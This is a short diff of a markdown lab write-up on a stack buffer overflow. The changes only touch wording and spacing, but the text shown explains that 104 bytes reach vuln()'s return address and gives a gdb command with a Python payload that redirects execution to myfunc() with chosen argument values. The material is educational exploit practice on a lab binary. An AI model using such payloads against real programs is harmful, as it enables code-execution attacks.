@@ -26,7 +26,8 @@
    
  - According to the stackframes above, in vuln(), the buf[] array has 100 bytes and ebp is 4 bytes, total is 104 bytes to reach return address. 
  - Insert 104 'a' characters to reach the exact memory location of the func variable, then insert the address of the myfunc() function "0x0804851b" to execute the myfunc()function, add value for q, p, and return address.
-    **Connect gdb and run again by this command:** 
+    
+    **Connect gdb and run by this command:** 
     >r $(python -c "print('a'*104+'\x1b\x85\x04\x08'+'\xe0\x83\x08\x04'+'\x11\x12\x04\x08'+'\x62\x42\x64\x44')")
 
     ![alt text](./images/image-36.png)
